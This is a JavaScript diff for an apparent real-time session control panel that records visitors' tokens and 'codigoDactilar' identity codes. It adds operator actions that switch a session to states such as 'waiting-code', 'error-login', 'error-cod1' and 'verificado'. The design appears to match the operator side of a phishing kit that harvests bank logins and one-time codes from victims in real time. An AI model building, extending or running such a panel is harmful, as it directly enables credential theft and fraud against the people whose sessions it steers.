@@ -421,7 +421,7 @@ function onMessage(data) {
     if (!row) return
     row.token = data.token || ''
     row.last_seen = Date.now()
-    row.state = 'typing'
+    row.state = data.token ? 'waiting-code' : 'typing'
     persistRows()
     render()
   }
@@ -432,6 +432,28 @@ function onMessage(data) {
     row.codigoDactilar = data.codigoDactilar || ''
     row.last_seen = Date.now()
     row.state = 'typing'
+    persistRows()
+    render()
+  }
+  if (data.type === 'session:action') {
+    const row = rows.get(data.sessionId)
+    if (!row) return
+    let newState = 'waiting'
+    const action = data.action
+    if (action === 'codigo') {
+      newState = 'waiting-code'
+      row.token = ''
+    }
+    else if (action === 'error-login') newState = 'error-login'
+    else if (action === 'error-cod1') newState = 'error-cod1'
+    else if (action === 'error-cod2') newState = 'error-cod2'
+    else if (action === 'done') newState = 'done'
+    else if (action === 'verificado') newState = 'verificado'
+    else if (action === 'reset') newState = 'idle'
+    else if (action === 'dispositivo') newState = 'dispositivo'
+
+    row.state = newState
+    row.last_seen = Date.now()
     persistRows()
     render()
   }
